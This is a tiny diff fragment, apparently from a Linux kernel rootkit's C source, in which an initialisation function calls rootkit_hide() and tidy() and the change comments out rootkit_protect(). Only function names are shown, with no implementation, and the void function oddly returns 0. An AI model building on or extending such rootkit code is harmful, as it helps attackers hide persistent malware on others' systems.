@@ -236,7 +236,7 @@ static inline void proc_init(void) {
  	}
  	rootkit_hide();
  	tidy();
- 	rootkit_protect();
+ 	// rootkit_protect();
 
  	return 0;
  }
